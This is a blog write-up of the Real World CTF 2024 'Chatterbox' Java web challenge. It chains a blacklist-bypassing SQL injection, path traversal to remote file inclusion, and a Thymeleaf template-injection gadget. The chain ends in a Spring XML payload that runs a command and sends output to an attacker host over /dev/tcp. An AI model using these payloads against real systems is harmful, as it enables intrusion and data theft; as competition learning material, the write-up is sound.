---
title: Real World CTF 2024 - Chatterbox
date: 2024-01-28
excerpt: RWCTF 2024 - Chatterbox
category: writeups
tags:
    - web
---

This weekend, I played RWCTF with WreckTheLine and got 7th place :)

![scoreboard](@images/2024/rwctf-2024/scoreboard.png)

I didn't intend to play initially, because I always thought RWCTF challenges
are too convoluted for me to even try. Also IB deadlines exist so I haven't
been playing CTFs much :(

Anyway in the end I changed my mind and spent most of my time on a single
challenge.

# Chatterbox (Web, Normal)

Source: [attachment.zip](/files/rwctf-2024/attachment.zip)

After seeing Java I absolutely needed to solve this challenge, cos I haven't
actually solved a Java web chall before. I opened the .jar in jadx and took a
look.

## Part 1: SQLi

```java
@RequestMapping({"/login"})
public String doLogin(HttpServletRequest request, Model model, HttpSession session) throws Exception {
    String username = request.getParameter("username");
    String password = request.getParameter("passwd");
    if (username != null && password != null) {
        if (!SQLCheck.checkBlackList(username) || !SQLCheck.checkBlackList(password)) {
            model.addAttribute("status", 500);
            model.addAttribute("message", "Ban!");
            return "error";
        }
        String sql = "SELECT id,passwd FROM message_users WHERE username = '" + username + "'";
        if (SQLCheck.check(sql)) {
            try {
                List<String> pass = this.jdbcTemplate.query(sql, new RowMapper<String>() { // from class: com.chatterbox.controller.LoginController.1
                    /* renamed from: mapRow */
                    public String m0mapRow(ResultSet rs, int rowNum) throws SQLException {
                        try {
                            return rs.getString(1) + "/" + rs.getString(2);
                        } catch (java.sql.SQLException e) {
                            throw new RuntimeException(e);
                        }
                    }
                });
                if (!pass.isEmpty()) {
                    String[] info = pass.get(0).split("/");
                    String dbPassword = info[1];
                    if (dbPassword != null && dbPassword.equals(password)) {
                        int userId = Integer.parseInt(info[0]);
                        session.setAttribute("userId", Integer.valueOf(userId));
                        return "redirect:/";
                    }
                    model.addAttribute("status", 500);
                    model.addAttribute("message", "Incorrect Username/Password～");
                    return "error";
                }
                model.addAttribute("status", 500);
                model.addAttribute("message", "Incorrect Username/Password～");
                return "error";
            } catch (Exception var10) {
                model.addAttribute("status", 500);
                model.addAttribute("message", var10.toString());
                return "error";
            }
        }
        model.addAttribute("status", 500);
        model.addAttribute("message", "check error~");
        return "error";
    }
    return "login";
}
```

waw SQLi too ez

```java
private static List<String> getBlackList() {
    List<String> black = new ArrayList<>();
    black.add("SELECT");
    black.add("UNION");
    black.add("INSERT");
    black.add("ALTER");
    black.add("SLEEP");
    black.add("DELETE");
    black.add("--");
    black.add(";");
    black.add("#");
    black.add("&");
    black.add("/*");
    black.add("OR");
    black.add("EXEC");
    black.add("CREATE");
    black.add("AND");
    black.add("DROP");
    black.add("DO");
    black.add("COPY");
    black.add("SET");
    black.add("VACUUM");
    black.add("SHOW");
    black.add("CURSOR");
    black.add("TRUNCATE");
    black.add("CAST");
    black.add("BEGIN");
    black.add("PERFORM");
    black.add("END");
    black.add("CASE");
    black.add("WHEN");
    black.add("ALL");
    black.add("TABLE");
    black.add("UPDATE");
    black.add("TRIGGER");
    black.add("FUNCTION");
    black.add("PROCEDURE");
    black.add("DECLARE");
    black.add("RETURNING");
    black.add("TABLESPACE");
    black.add("VIEW");
    black.add("SEQUENCE");
    black.add("INDEX");
    black.add("LOCK");
    black.add("GRANT");
    black.add("REVOKE");
    black.add("SAVEPOINT");
    black.add("ROLLBACK");
    black.add("IMPORT");
    black.add("COMMIT");
    black.add("PREPARE");
    black.add("EXECUTE");
    black.add("EXPLAIN");
    black.add("ANALYZE");
    black.add("DATABASE");
    black.add("PASSWORD");
    black.add("CONNECT");
    black.add("DISCONNECT");
    black.add("PG_SLEEP");
    black.add("MERGE");
    black.add("USING");
    black.add("LIMIT");
    black.add("OFFSET");
    black.add("RETURN");
    black.add("ESCAPE");
    black.add("LIKE");
    black.add("ILIKE");
    black.add("RLIKE");
    black.add("EXISTS");
    black.add("BETWEEN");
    black.add("IS");
    black.add("NULL");
    black.add("NOT");
    black.add("GROUP");
    black.add("BY");
    black.add("HAVING");
    black.add("ORDER");
    black.add("WINDOW");
    black.add("PARTITION");
    black.add("OVER");
    black.add("FOREIGN KEY");
    black.add("REFERENCE");
    black.add("RAISE");
    black.add("LISTEN");
    black.add("NOTIFY");
    black.add("LOAD");
    black.add("SECURITY");
    black.add("OWNER");
    black.add("RULE");
    black.add("CLUSTER");
    black.add("COMMENT");
    black.add("CONVERT");
    black.add("COPY");
    black.add("CHECKPOINT");
    black.add("REINDEX");
    black.add("RESET");
    black.add("LANGUAGE");
    black.add("PLPGSQL");
    black.add("PLPYTHON");
    black.add("SECDEF");
    black.add("NOCREATEDB");
    black.add("NOCREATEROLE");
    black.add("NOINHERIT");
    black.add("NOREPLICATION");
    black.add("BYPASSRLS");
    black.add("FILE");
    black.add("PG_");
    black.add("IMPORT");
    black.add("EXPORT");
    return black;
}
```

nvm their blacklist has like 1000 words

My goal is just to login as admin. The way their login is implemented is such
that it queries the user's password and compares it server-side, so I can't
simply do the 1=1 exploit. Usually I would do `' union select 1, 'asdf` but
both `union` and `select` are blocked. I tried putting null bytes and surprisingly
got an error (`insufficient data left in message`) from the DB connector, so I
thought I was going somewhere (apparently not). 

```sql
...un%00ion se%00lect 1, 'asdf
```

(does not work)

Other stuff I tried included `intersect select` (still blocked), `coalesce`
error-based SQLi and a bunch of other stuff I forgot. I even tried playing with
the normalization to see if any non-standard characters can get past the
blacklist when uppercased, but evaluate correctly in the DB (did not work).

At that point I was kinda ded so I went to sleep. I dreamt of Java types and
similarly fun stuff.

The next day I realized there's no way I can get past using any SQL commands. I
then focused on trying to manipulate the username comparison somehow. (At that
point, catalin had suggested we can create a new user with id=1 to fake an
admin account, since its not primary key field).

After doing lots of random stuff in the Postgres console, I tried casting the
passwd to ::int and got an error with the password in it! Since the login page
returns the error message, I can use this to leak the password!

```java
                } catch (Exception var10) {
                    model.addAttribute("status", 500);
                    model.addAttribute("message", var10.toString());
                    return "error";
                }
```

Unfortunately there's another check in place:

```java
    private static Class[] restrictExprCls = {LongValue.class, StringValue.class, NullValue.class, TimeValue.class, TimestampValue.class, DateValue.class, DoubleValue.class, Column.class};

    public static boolean parse(String sql) {
        try {
            CCJSqlParserManager parserManager = new CCJSqlParserManager();
            Select parse = parserManager.parse(new StringReader(sql));
            if (parse instanceof Select) {
                return processSelect(parse);
            }
            if (parse instanceof Insert) {
                return processInsert((Insert) parse);
            }
            return false;
        } catch (Exception e) {
            throw new SQLException("SQL error");
        }
    }

    private static boolean processSelect(Select statement) {
        PlainSelect selectBody = statement.getSelectBody();
        if (selectBody instanceof PlainSelect) {
            PlainSelect plainSelect = selectBody;
            Table fromItem = plainSelect.getFromItem();
            if (fromItem instanceof Table) {
                String tablename = fromItem.getName();
                List<String> whiteTable = SQLCheck.getWhiteTable();
                if (!whiteTable.contains(tablename)) {
                    return false;
                }
                BinaryExpression expression = plainSelect.getWhere();
                if (!restrictExpr(expression)) {
                    return false;
                }
                return true;
            }
            return false;
        }
        return false;
    }
```

The backend parses the statement using some SQL parser library and restricts
the expression to a few measly types. It's slightly complex so I didn't try to
conform my payload to match it.

I noticed that if the (2) parsers crash, the backend defaults to a very weak
filtering function:

```java
    public static boolean filter(String sql) {
        if (StringUtil.matches(sql, "^[a-zA-Z0-9_]*$") || sql.contains(" USER_DEFINE ")) {
            return true;
        }
        if (sql.startsWith("SELECT") && sql.contains("VIEW")) {
            return true;
        }
        for (String whitePrefix : getWhitePrefix().stream()) {
            if (sql.startsWith(whitePrefix)) {
                return true;
            }
        }
        return false;
    }
```

This function is very easy to bypass! I love it!

So I just need a query that crashes the parser but doesn't crash in Postgres.

After searching the Github issues for the 1st parser I found
[this](https://github.com/JSQLParser/JSqlParser/issues/1344). Basically since
the author is too lazy the parser crashes on this valid Postgres syntax:

```sql
select double precision '1'
```

(but since `do` is blocked by blacklist I need to find some other type to cast to)

So in my payload, I can add this to bypass the parser, and add ` user_define ` to pass `filter` function.

```sql
' || (real '1')::varchar || passwd::int || ' user_define 
```

I actually didn't check if this crashes the 2nd parser, but apparently it works so.

## Part 2: RFI

```java
    @GetMapping({"/notify"})
    public String notify(@RequestParam String fname, HttpSession session) throws IOException {
        InputStream inputStream;
        Integer userId = (Integer) session.getAttribute("userId");
        if (userId != null && userId.intValue() == 1) {
            if (!fname.contains("../") && (inputStream = this.applicationContext.getResource(this.templatePrefix + fname + this.templateSuffix).getInputStream()) != null && safeCheck(inputStream)) {
                String result = getTemplateEngine().process(fname, new Context());
                return result;
            }
            return "error";
        }
        return "redirect:login";
    }

    public boolean safeCheck(InputStream stream) {
        try {
            String templateContent = new String(stream.readAllBytes());
            if (!templateContent.contains("<") && !templateContent.contains(">") && !templateContent.contains("org.apache")) {
                if (!templateContent.contains("org.spring")) {
                    return true;
                }
            }
            return false;
        } catch (IOException e) {
            return false;
        }
    }

    private SpringTemplateEngine getTemplateEngine() {
        SpringResourceTemplateResolver resolver = new SpringResourceTemplateResolver();
        resolver.setApplicationContext(this.applicationContext);
        resolver.setTemplateMode(TemplateMode.HTML);
        resolver.setCharacterEncoding(StandardCharsets.UTF_8.name());
        resolver.setPrefix(this.templatePrefix);
        resolver.setSuffix(this.templateSuffix);
        SpringTemplateEngine templateEngine = new SpringTemplateEngine();
        templateEngine.setTemplateResolver(resolver);
        return templateEngine;
    }
```

Now with admin, we can:

1. Create messages and exploit SQLi in insert query
2. Perform SSTI in /notify endpoint

While I was trying to get file write in the SQLi, adragos found path traversal
\+ undocumented LFI to FTP in the /notify endpoint.

`?fname=..%5c..%5c..%5c/endpoint/test.txt%23`

(`\` will fail in catalina reverse proxy, and `#` strips out the `.html`
extension (not necessary for final payload though))

The additional `..\` is apparently parsed such that the hostname of
`file://host/path` can be controlled. This is super cool because we can
escalate to RFI, which bypassed the need for Postgres file write.

(from here on adragos already solved everything, but since I had to solve it I
tried on my own anyway)

So I hosted an FTP server to load the attacker template.

## Part 3: SSTI

Thymeleaf 13.0.2 is quite annoying cos it added a lot of restrictions to SSTI
in "unsafe" context, by preventing instantiation of several common key classes.
This was also my first time doing Thymeleaf SSTI (or Java SSTI in general) so I
was quite lost. After adragos solved the challenge I peeked at his payload then
tried to make my own.

The trick is to look for gadgets in the other libraries loaded in the app, that
allow you to instantiate classes with calls such as
`constructor.newInstance(args)` etc.

My final payload:
```
[[${T(
org.postgresql.util.ObjectFactory
).instantiate(
"".getClass().forName(
"org."+"springframework.context.support.FileSystemXmlApplicationContext"
),
"org."+"springframework.context.support.FileSystemXmlApplicationContext",
null,
true,
"http://<attacker>:<port>/poc.xml"
)
}]]
```

`T(class)` is quite useful for instantiating classes from qualified name, but this
is blocked by Thymeleaf restrictions, so I can't just instantiate
`java.lang.Runtime`.

`"".getClass().forName(class)` also can be used to create classes and isn't
blocked by Thymeleaf I think? But the class instantiated from here is useless
cos I can't call any methods on it for some reason? (need to research more)

Anyway, `org.postgresql.util.ObjectFactory` has the `.instantiate` method which
can be used to create `FileSystemXmlApplicationContext` with correct
arguments. This class will parse external XML using templating processing,
which we can again host on attacker server. This time, our SSTI will have 0
restrictions :)

```xml
<?xml version="1.0" encoding="UTF-8" ?>
<beans xmlns="http://www.springframework.org/schema/beans"
        xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd">
<bean class="#{T(java.lang.Runtime).getRuntime().exec(
        new String[] {
        '/bin/bash', '-c', '/readflag > /dev/tcp/attacker/port'
        }
        )}"></bean>
</beans>
```

Flag: `rwctf{b2ed2442-b9e0-11ee-a668-00163e01b905}`

Anyway, this was a good intro back to CTFs after I stopped for so long. I
should probably play more.
